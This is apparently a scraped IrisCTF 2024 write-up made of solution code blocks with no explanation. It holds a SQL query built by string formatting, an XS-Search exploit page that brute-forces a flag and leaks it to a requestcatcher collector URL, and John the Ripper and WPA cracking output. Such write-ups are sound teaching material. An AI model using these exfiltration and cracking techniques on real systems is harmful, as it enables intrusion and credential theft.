# IrisCTF 2024 Writeup

> 原文: https://www.ctfiot.com/154500.html
> ID: 154500


```
CREATE TABLE IF NOT EXISTS users ( username text, password text );
INSERT INTO users ( username, password ) VALUES ( "root", "IamAvEryC0olRootUsr");
INSERT INTO users ( username, password ) VALUES ( "skat", "fakeflg{fake_flag}");
INSERT INTO users ( username, password ) VALUES ( "coded", "ilovegolang42");
qstring := fmt.Sprintf("SELECT * FROM users WHERE username = \"%s\" AND password = \"%s\"", input.Username, input.Password)
const context = await browser.createIncognitoBrowserContext();
const page = await context.newPage();
await page.goto("https://lamenote-web.chal.irisc.tf/");
const frameWrapper = await page.waitForSelector('iframe');
const frame = await frameWrapper.contentFrame();
await frame.type('input[name=title]', 'Flag');
await frame.type('input[name=text]', 'irisctf{FAKEFLAGFAKEFLAG}');
await frame.type('input[name=image]', 'https://i.imgur.com/dQJOyoO.png');
await frame.click('form[method=post] button[type=submit]');
await page.waitForTimeout(1000);
await frameWrapper.dispose();
@app.route("/search")
@check_request
def search():
 query = request.args.get("query", "")
 user = request.cookies.get("user", None)
 results = []
 notes_copy = copy.deepcopy(NOTES)
 for note in notes_copy.values():
 if note["owner"] == user and (query in note["title"] or query in note["text"]):
 results.append(note)
 if len(results) >= 5:
 break

 if len(results) == 0:
 return "<!DOCTYPE html>No notes."

 if len(results) == 1:
 return render_note(results[0])

 return "<!DOCTYPE html>" + "".join("<a href='/note/" + note["id"] + "'>" + note["title"] + "</a> " for note in results) + ""

<script>
 const sleep = ms => new Promise(r => setTimeout(r, ms));
 const prefix = "irisctf{please_";
 const chars = "abcdefghijklmnopqrstuvwxyz_";
 setTimeout(async () => {
 for (var i in chars) {
 form.title.value = prefix + chars[i];
 form.text.value = prefix + chars[i];
 form.image.value = "https://[yours].requestcatcher.com/" + prefix + chars[i];
 form.submit();
 await sleep(500);
 }
 for (var i in chars) {
 form2.query.value = prefix + chars[i];
 form2.submit();
 await sleep(500);
 }
 }, 0);
</script>


<form method="POST" target="dummyFrame" id="form" action="https://lamenote-web.chal.irisc.tf/create">
 
 
 
</form>
<form method="GET" target="dummyFrame" id="form2" action="https://lamenote-web.chal.irisc.tf/search">
 
</form>

$ /usr/share/john/ssh2john.py home_skat/skat/.ssh/id_rsa > h

$ john --wordlist=/usr/share/wordlists/rockyou.txt h
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
password (home_skat/skat/.ssh/id_rsa)
1g 0:00:00:03 DONE (2024-01-06 22:09) 0.3030g/s 19.39p/s 19.39c/s 19.39C/s 123456..charlie
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
[wifi-security]
auth-alg=open
key-mgmt=wpa-psk
psk=agdifbe7dv1iruf7ei2v5op
[00:01:57] 894908/14344392 keys tested (7729.15 k/s)

 Time left: 29 minutes, 0 seconds 6.24%

 KEY FOUND! [ humus12345 ]

 Master Key : 26 C8 6B 47 25 1E 06 AF 93 FB 5D D8 65 31 C8 F6
 63 DE FA 79 40 DF 81 CB 87 0A 9C 3D 1E 49 24 FD

 Transient Key : 29 E7 72 00 5A C8 40 00 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00

 EAPOL HMAC : 37 CC 99 33 10 76 AC 0C D2 11 96 09 E4 8F 22 57
220 (vsFTPd 3.0.3)
USER joeschmoe
331 Please specify the password.
PASS irisctf{welc0me_t0_th3_n3twork_c4teg
230 Login successful.
png_bytes = []
for i in range(3):
 with open(f"beautiful_fish_{i}.png","rb") as fp:
 png_bytes.append(fp.read())

with open(f"out.png","wb") as fp:
 while True:
 while 1 <= len(png_bytes) and len(png_bytes[0]) == 0:
 png_bytes = png_bytes[1:]
 while 2 <= len(png_bytes) and len(png_bytes[1]) == 0:
 if len(png_bytes) == 2:
 png_bytes = [png_bytes[0]]
 else:
 png_bytes = [png_bytes[0], png_bytes[2]]
 while 3 <= len(png_bytes) and len(png_bytes[2]) == 0:
 png_bytes = png_bytes[:-1]

 if len(png_bytes) == 0:
 break

 if len(png_bytes) == 1:
 print('My assumption is wrong... 1')
 exit(1)

 if len(png_bytes) == 2:
 if png_bytes[0][0] == png_bytes[1][0]:
 fp.write(png_bytes[0][0].to_bytes(1, 'big'))
 png_bytes[0] = png_bytes[0][1:]
 png_bytes[1] = png_bytes[1][1:]
 continue
 else:
 print('My assumption is wrong... 2')
 exit(2)

 # len(png_bytes) == 3
 if (png_bytes[0][0] == png_bytes[1][0]) and (png_bytes[2][0] == png_bytes[1][0]):
 fp.write(png_bytes[0][0].to_bytes(1, 'big'))
 png_bytes[0] = png_bytes[0][1:]
 png_bytes[1] = png_bytes[1][1:]
 png_bytes[2] = png_bytes[2][1:]
 elif png_bytes[0][0] == png_bytes[1][0]:
 fp.write(png_bytes[0][0].to_bytes(1, 'big'))
 png_bytes[0] = png_bytes[0][1:]
 png_bytes[1] = png_bytes[1][1:]
 elif png_bytes[0][0] == png_bytes[2][0]:
 fp.write(png_bytes[0][0].to_bytes(1, 'big'))
 png_bytes[0] = png_bytes[0][1:]
 png_bytes[2] = png_bytes[2][1:]
 elif png_bytes[1][0] == png_bytes[2][0]:
 fp.write(png_bytes[1][0].to_bytes(1, 'big'))
 png_bytes[1] = png_bytes[1][1:]
 png_bytes[2] = png_bytes[2][1:]
 else:
 idx01 = png_bytes[1].find(png_bytes[0][:10])
 idx02 = png_bytes[2].find(png_bytes[0][:10])
 if 0 <= idx01 or 0 <= idx02:
 if idx02 < idx01:
 fp.write(png_bytes[1][0].to_bytes(1, 'big'))
 png_bytes[1] = png_bytes[1][1:]
 continue
 else:
 fp.write(png_bytes[2][0].to_bytes(1, 'big'))
 png_bytes[2] = png_bytes[2][1:]
 continue

 idx10 = png_bytes[0].find(png_bytes[1][:10])
 idx12 = png_bytes[2].find(png_bytes[1][:10])
 if 0 <= idx10 or 0 <= idx12:
 if idx12 < idx10:
 fp.write(png_bytes[0][0].to_bytes(1, 'big'))
 png_bytes[0] = png_bytes[0][1:]
 continue
 else:
 fp.write(png_bytes[2][0].to_bytes(1, 'big'))
 png_bytes[2] = png_bytes[2][1:]
 continue

 idx20 = png_bytes[0].find(png_bytes[2][:10])
 idx21 = png_bytes[1].find(png_bytes[2][:10])
 if 0 <= idx21 or 0 <= idx20:
 if idx20 < idx21:
 fp.write(png_bytes[1][0].to_bytes(1, 'big'))
 png_bytes[1] = png_bytes[1][1:]
 continue
 else:
 fp.write(png_bytes[0][0].to_bytes(1, 'big'))
 png_bytes[0] = png_bytes[0][1:]
 continue

 print('My assumption is wrong... 3')
 exit(3)
$ file *
main: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=f9dc64e1f81cfd02193274da700f1de05742fd83, for GNU/Linux 3.2.0, not stripped
chosenFoods.James != 2
chosenFoods.William != 2
chosenFoods.William != 3
chosenFoods.Alice == 4

chosenColors.Emma != 1
chosenColors.Alice != 3
chosenColors.Emma != 3
chosenColors.William == 2
chosenColors.James != 4
chosenColors.Alice 1 red
chosenColors.Emma 4 yellow
chosenColors.James 3 green
chosenColors.William 2 blue

chosenFoods.Alice 4 chicken
chosenFoods.Emma 2 pasta
chosenFoods.James 3 steak
chosenFoods.William 1 pizza
package main

import (
 "fmt"
 "os"
 "strings"
 "io/ioutil"
 "bytes"
)

func gen(payload string) {
 runed := []string{}
 z := rune(0)

 for _, v := range payload {
 runed = append(runed, string(v+z))
 z = v
 }

 payload = strings.Join(runed, "")

 file, err := os.OpenFile("the2", os.O_RDWR | os.O_CREATE, 0644)
 if err != nil {
 fmt.Println(err)
 return
 }

 defer file.Close()
 if _, err := file.Write([]byte(payload)); err != nil {
 fmt.Println(err)
 return
 }
}

func check() bool {
 b1, _ := ioutil.ReadFile("the")
 b2, _ := ioutil.ReadFile("the2")
 return bytes.HasPrefix(b1, b2)
}

func main() {
 flag := "irisctf{i_r3411y"
 for i := 0; i < 256; i++ {
 gen(flag + string(i))
 if check() {
 fmt.Println(flag + string(i))
 }
 }
}
```
